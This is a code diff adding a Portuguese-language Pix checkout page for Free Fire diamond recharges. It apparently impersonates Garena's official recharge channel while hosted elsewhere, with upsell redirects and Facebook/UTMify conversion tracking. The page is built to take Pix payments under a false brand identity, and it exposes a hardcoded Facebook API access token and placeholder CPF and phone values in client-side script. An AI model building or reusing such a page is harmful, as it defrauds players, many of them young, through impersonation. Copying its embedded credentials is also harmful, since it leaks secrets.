@@ -1,0 +1,597 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <meta charset="UTF-8">
+
+<script>
+const FB_PIXEL_ID = "1607320653270124";
+const FB_ACCESS_TOKEN = "EAAKUiqK4SKwBPD0fJYbsFIHS9bcNDlqs0JlKeiZBsFMqeKZCxoiOvF3uvxJZBYhj5dHafyWQlvY1HzQbbR6jaHKHHZCmTg168oSn4b4bmW2Ynl7vLm8EPct8gdJrrSzBuxVnPvSKadeMnZBxoc5bHOxmbCIufdJTZAdGAZBM6yZAAtmc0uGLvIxugmqheAzo3PzQOQZDZD";
+const REDIRECT_URL = "https://freefirereward.site/upsell.html";
+</script>
+
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <script>
+      (function esperarUTMify() {
+        const check = () => {
+          try {
+            if (window.__utmify && window.__utmify.cid) {
+              localStorage.setItem("utmify_cid", window.__utmify.cid);
+              console.log("✅ CID salvo:", window.__utmify.cid);
+              return true;
+            }
+          } catch (e) {}
+          return false;
+        };
+
+        let tentativas = 0;
+        const intervalo = setInterval(() => {
+          tentativas++;
+          if (check() || tentativas >= 20) clearInterval(intervalo);
+        }, 300);
+      })();
+    </script>
+
+<script>
+async function enviarPostbackFacebook(valor, email) {
+    const fbclid = localStorage.getItem("fbclid");
+    const payload = {
+        data: [{
+            event_name: "Purchase",
+            event_time: Math.floor(Date.now() / 1000),
+            action_source: "website",
+            event_source_url: window.location.href,
+            user_data: { em: [email], fbclid: fbclid },
+            custom_data: { currency: "BRL", value: valor }
+        }]
+    };
+    await fetch(`https://graph.facebook.com/v17.0/${FB_PIXEL_ID}/events?access_token=${FB_ACCESS_TOKEN}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+    });
+    console.log("Postback enviado ao Facebook CAPI.");
+}
+
+async function enviarPostbackUtmify(valor) {
+    const cid = localStorage.getItem("utmify_cid");
+    if (!cid) return;
+    await fetch("https://utmify.com.br/api/postback", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ cid: cid, value: valor, event: "purchase" })
+    });
+    console.log("Postback enviado ao UTMify.");
+}
+</script>
+
+    <!-- Pixel do Facebook -->
+    <script>
+      !(function (f, b, e, v, n, t, s) {
+        if (f.fbq) return;
+        n = f.fbq = function () {
+          n.callMethod
+            ? n.callMethod.apply(n, arguments)
+            : n.queue.push(arguments);
+        };
+        if (!f._fbq) f._fbq = n;
+        n.push = n;
+        n.loaded = !0;
+        n.version = "2.0";
+        n.queue = [];
+        t = b.createElement(e);
+        t.async = !0;
+        t.src = v;
+        s = b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t, s);
+      })(
+        window,
+        document,
+        "script",
+        "https://connect.facebook.net/en_US/fbevents.js"
+      );
+      fbq("init", "687601267581599");
+      fbq("track", "PageView");
+    </script>
+    <noscript>
+      <img
+        height="1"
+        width="1"
+        style="display: none"
+        src="https://www.facebook.com/tr?id=687601267581599&ev=PageView&noscript=1"
+      />
+    </noscript>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Finalizar Pagamento - Free Fire</title>
+    <meta name="description" content="Finalize sua recarga de diamantes Free Fire com Pix, de forma segura, rápida e sem complicações.">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <script src="js/qrious.min.js"></script>
+    <style>
+      * {
+        box-sizing: border-box;
+      }
+      body {
+        margin: 0;
+        font-family: "Roboto", sans-serif;
+        background-color: #f5f5f5;
+        color: #323232;
+      }
+      header {
+        display: flex;
+        align-items: center;
+        padding: 10px 20px;
+        background-color: white;
+        border-bottom: 1px solid #ddd;
+      }
+      .logo-container {
+        display: flex;
+        align-items: center;
+      }
+      .logo-container img {
+        height: 40px;
+        margin-right: 8px;
+      }
+      .separator {
+        width: 1px;
+        height: 40px;
+        background: #ddd;
+        margin-right: 15px;
+      }
+      .title-text {
+        font-size: 16px;
+        line-height: 1.2;
+      }
+      .banner-freefire {
+        position: relative;
+        width: 100%;
+        height: 150px;
+        background: url("images/fundo.jpg") center/cover no-repeat;
+      }
+      @media (max-width: 600px) {
+        .banner-freefire {
+          height: 100px;
+        }
+      }
+      .btn-voltar {
+        position: absolute;
+        top: 15px;
+        left: 15px;
+        background: rgba(0, 0, 0, 0.6);
+        color: white;
+        border: none;
+        padding: 8px 15px;
+        font-size: 16px;
+        border-radius: 20px;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        text-decoration: none;
+      }
+      .btn-voltar::before {
+        content: "<";
+        margin-right: 8px;
+        font-size: 18px;
+      }
+      .icon-center {
+        position: absolute;
+        bottom: -40px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: white;
+        border-radius: 20px;
+        padding: 5px;
+        box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
+      }
+      .icon-center img {
+        width: 80px;
+        height: 80px;
+        border-radius: 16px;
+      }
+      .section-info {
+        background: #ffffff;
+        max-width: 400px;
+        width: 90%;
+        margin: 0 auto;
+        border-radius: 0 0 8px 8px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
+        padding: 80px 20px 20px 20px;
+        margin-top: -40px;
+        font-size: 15px;
+      }
+      .row {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin: 6px 0;
+      }
+      .price-block {
+        background: #f9f9f9;
+        border: 1px solid #eee;
+        padding: 10px;
+        border-radius: 8px;
+        margin: 10px 0;
+        font-size: 14px;
+      }
+      .qrcode-container {
+        background: white;
+        max-width: 400px;
+        width: 90%;
+        margin: 20px auto;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
+        padding: 20px;
+        text-align: center;
+        position: relative;
+      }
+      .qrcode-title {
+        font-size: 18px;
+        font-weight: 600;
+        margin-bottom: 15px;
+      }
+      #pix-code {
+        background: #f9f9f9;
+        border: 1px solid #ddd;
+        padding: 10px;
+        border-radius: 6px;
+        font-size: 13px;
+        word-wrap: break-word;
+        margin: 15px 0;
+        max-height: 150px;
+        overflow-y: auto;
+        text-align: left;
+      }
+      #pix-wrapper {
+        text-align: center;
+      }
+      #pix-wrapper canvas {
+        display: inline-block;
+      }
+      .instructions {
+        font-size: 13px;
+        color: #555;
+        text-align: left;
+        margin-top: 15px;
+      }
+      button {
+        background: #d60000;
+        color: #fff;
+        border: none;
+        padding: 12px;
+        border-radius: 6px;
+        cursor: pointer;
+        width: 100%;
+        font-size: 16px;
+        margin-top: 10px;
+      }
+      .bump-row {
+        color: #f59e0b;
+        font-weight: 500;
+      }
+      footer {
+        font-size: 12px;
+        color: #777;
+        text-align: center;
+        padding: 20px;
+        line-height: 1.6;
+      }
+
+      /* Loader circular vermelho */
+      .loader {
+        border: 8px solid #f3f3f3;
+        border-top: 8px solid #d60000;
+        border-radius: 50%;
+        width: 60px;
+        height: 60px;
+        animation: spin 1s linear infinite;
+        margin: 20px auto;
+      }
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <header>
+      <div class="logo-container">
+        <img src="images/logo.png" alt="Garena Logo">
+        <div class="separator"></div>
+        <div class="title-text">Canal Oficial de<br>Recarga</div>
+      </div>
+    </header>
+
+    <div class="banner-freefire">
+      <a href="checkout.html" class="btn-voltar">Voltar</a>
+      <div class="icon-center">
+        <img src="images/icon.png" alt="Free Fire">
+      </div>
+    </div>
+
+    <section class="section-info">
+      <div class="row">
+        <span>Total</span><span>💎 <strong>6.720</strong></span>
+      </div>
+      <div class="price-block">
+        <div class="row"><span>Preço Original</span><span>💎 5.600</span></div>
+        <div class="row"><span>+ Bônus Geral</span><span>💎 1.120</span></div>
+        <div id="order-bumps-container"></div>
+      </div>
+      <p style="font-size: 12px; color: #555">
+        Os diamantes são válidos apenas para a região do Brasil e serão
+        creditados diretamente na conta de jogo.
+      </p>
+      <div class="row">
+        <span>Preço</span><span><strong id="price-final">R$ 19,97</strong></span>
+      </div>
+      <div class="row">
+        <span>Método de pagamento</span><span><strong>Pix</strong></span>
+      </div>
+    </section>
+
+    <div class="qrcode-container">
+      <div class="qrcode-title">Pague com Pix</div>
+      <div id="loading" class="loader"></div>
+      <div id="pix-wrapper" style="display: none; text-align: center">
+        <canvas id="pix-qrcode"></canvas>
+      </div>
+      <div id="pix-code" style="display: none"></div>
+
+      <!-- BOX DE AVISO -->
+      <div id="pix-warning" style="
+          display: none;
+          background: #fdf4f5;
+          border: 1px solid #d60000;
+          border-radius: 6px;
+          padding: 8px 12px;
+          font-size: 12px;
+          color: #555;
+          text-align: center;
+          margin: 10px 0;
+        ">
+        ⚠️ Não feche esta página até que seu pagamento seja confirmado para
+        evitar problemas no processo.
+      </div>
+
+      <button id="copiar-pix" style="display: none">Copiar Código</button>
+
+      <div class="instructions">
+        <p><strong>Para realizar o pagamento siga os passos abaixo:</strong></p>
+        <p>
+          1) Abra o app ou o site da sua instituição financeira e selecione o
+          Pix
+        </p>
+        <p>2) Utilize as informações acima para realizar o pagamento</p>
+        <p>3) Revise as informações e pronto!</p>
+        <p>
+          Seu pedido está sendo processado pelo nosso parceiro. Você receberá
+          seus diamantes após recebermos a confirmação do pagamento. Isso ocorre
+          geralmente em alguns minutos após a realização do pagamento na sua
+          instituição financeira.
+        </p>
+      </div>
+    </div>
+
+    <footer>
+      <p>© Garena Online. Todos os direitos reservados.</p>
+      <p>
+        FAQ � | � Central de Ajuda � | � Termos e condições
+      </p>
+      <p>Política de privacidade</p>
+    </footer>
+
+    <script>
+      // Recupera dados do localStorage
+      const email =
+        localStorage.getItem("checkout_email") || "comprador@frifas.com";
+      const telefone =
+        localStorage.getItem("checkout_telefone") || "6137449965";
+      const nome = localStorage.getItem("checkout_nome") || "Free Fire";
+      const cpf = localStorage.getItem("checkout_cpf") || "52849382086";
+      const orderBumps = JSON.parse(
+        localStorage.getItem("checkout_orderBumps") || "[]"
+      );
+      const total = parseFloat(
+        localStorage.getItem("checkout_total") || "19.90"
+      );
+
+      // Exibe order bumps
+      const bumpsContainer = document.getElementById("order-bumps-container");
+      if (orderBumps.length > 0) {
+        orderBumps.forEach((bump) => {
+          const div = document.createElement("div");
+          div.className = "row bump-row";
+          div.innerHTML = `<span>+ ${bump.name}</span><span>R$ ${bump.price
+            .toFixed(2)
+            .replace(".", ",")}</span>`;
+          bumpsContainer.appendChild(div);
+        });
+      }
+
+      // Atualiza preço final
+      document.getElementById("price-final").innerText = `R$ ${total
+        .toFixed(2)
+        .replace(".", ",")}`;
+
+      // Função para gerar Pix
+      async function gerarPix() {
+        // Captura os parâmetros UTM da URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const utmData = {
+          utm_source: urlParams.get("utm_source") || "",
+          utm_medium: urlParams.get("utm_medium") || "",
+          utm_campaign: urlParams.get("utm_campaign") || "",
+          utm_content: urlParams.get("utm_content") || "",
+          utm_term: urlParams.get("utm_term") || "",
+          xcod: urlParams.get("xcod") || "",
+          sck: urlParams.get("sck") || "",
+        };
+
+        console.log("[Pagamento] Parâmetros UTM capturados:", utmData);
+        const total = localStorage.getItem("checkout_total") || "19.90";
+        const totalToSend = total * 100; // Converte para centavos
+        const formData = new FormData();
+
+        formData.append("telefone", "11999999999");
+        formData.append("priceInCents", totalToSend); // Corrigido para usar totalToSend
+
+        Object.entries(utmData).forEach(([key, value]) => {
+          formData.append(key, value);
+        });
+
+        console.log(
+          "[Pagamento] Dados enviados para o servidor:",
+          Object.fromEntries(formData.entries())
+        );
+
+try {
+    const response = await fetch("pagamento.php", {
+        method: "POST",
+        body: formData,
+    });
+    const data = await response.json();
+
+    // === Dispara postback de venda pendente para UTMify ===
+    const cid = localStorage.getItem("utmify_cid");
+    const valor = parseFloat(localStorage.getItem("checkout_total") || "0");
+
+    if (cid) {
+        await fetch("https://utmify.com.br/api/postback", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                cid: cid,
+                value: valor,
+                event: "pending"
+            })
+        });
+        console.log("Postback UTMify enviado com sucesso!");
+    }
+
+    if (data.qrCodeUrl && data.pixCode) {
+        sessionStorage.setItem("pix_transacao", data.token);
+        document.getElementById("loading").style.display = "none";
+        document.getElementById("pix-wrapper").style.display = "block";
+
+            const canvas = document.getElementById("pix-qrcode");
+            new QRious({
+              element: canvas,
+              value: data.pixCode,
+              size: 250,
+            });
+
+            const pixCodeDiv = document.getElementById("pix-code");
+            pixCodeDiv.style.display = "block";
+            pixCodeDiv.innerText = data.pixCode;
+
+            const btn = document.getElementById("copiar-pix");
+            btn.style.display = "block";
+
+            // Mostra a box de aviso
+            document.getElementById("pix-warning").style.display = "block";
+
+            btn.addEventListener("click", function () {
+              navigator.clipboard.writeText(data.pixCode).then(() => {
+                btn.innerText = "Código Copiado!";
+                setTimeout(() => {
+                  btn.innerText = "Copiar Código";
+                }, 2000);
+              });
+            });
+
+monitorarPagamento(data.token);
+
+// === Dispara postback de venda pendente para UTMify ===
+const cid = localStorage.getItem("utmify_cid");
+const valor = parseFloat(localStorage.getItem("checkout_total") || "0");
+await fetch("https://utmify.com.br/api/postback", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+        cid: cid,
+        value: valor,
+        event: "pending"
+    })
+});
+console.log("Postback UTMify (pendente) enviado!");
+          } else {
+            document.getElementById("loading").style.display = "none";
+            alert("Erro ao gerar QR Code Pix.");
+          }
+        } catch (error) {
+          console.error(error);
+          document.getElementById("loading").style.display = "none";
+          alert("Erro ao gerar QR Code Pix.");
+        }
+      }
+
+function monitorarPagamento(id) {
+    const interval = setInterval(async () => {
+        try {
+            const response = await fetch(`verificar.php?id=${id}`);
+            const data = await response.json();
+            console.log(data);
+
+            if (data.status === "APPROVED" || data.status === "paid") {
+                clearInterval(interval);
+
+                // Recupera valores
+                const valor = parseFloat(localStorage.getItem("checkout_total") || "19.90");
+                const orderBumps = JSON.parse(localStorage.getItem("checkout_orderBumps") || "[]");
+                const quantidade = 1 + orderBumps.length;
+
+                // Monta os itens comprados para o Pixel
+                let contents = [
+                    {
+                        id: data.transaction_id,
+                        quantity: 1,
+                        item_price: parseFloat((valor / quantidade).toFixed(2)),
+                    },
+                ];
+                if (orderBumps.length > 0) {
+                    orderBumps.forEach((item, index) => {
+                        contents.push({
+                            id: data.transaction_id + "-bump" + index,
+                            quantity: 1,
+                            item_price: parseFloat(item.price.toFixed(2)),
+                        });
+                    });
+                }
+
+                // Dispara evento no Facebook Pixel
+                if (typeof fbq !== "undefined") {
+                    fbq("track", "Purchase", {
+                        value: valor,
+                        currency: "BRL",
+                        content_name: "Recarga + Upsell",
+                        content_ids: contents.map((c) => c.id),
+                        num_items: quantidade,
+                        contents: contents,
+                    });
+                }
+
+                // Dispara postbacks
+                const email = localStorage.getItem("checkout_email") || "comprador@teste.com";
+                await enviarPostbackFacebook(valor, email);
+                await enviarPostbackUtmify(valor);
+                console.log("Postbacks enviados com sucesso!");
+
+                // Redireciona para o upsell mantendo UTMs
+                setTimeout(() => {
+                    const params = window.location.search;
+                    window.location.href = REDIRECT_URL + params;
+                }, 1200);
+            } // <-- FECHA O IF AQUI
+
+        } catch (error) {
+            console.error("Erro ao verificar pagamento:", error);
+        }
+    }, 4000);
+}
+      // Chama ao carregar
+      gerarPix();
+    </script>
+  
+
+</body></html>
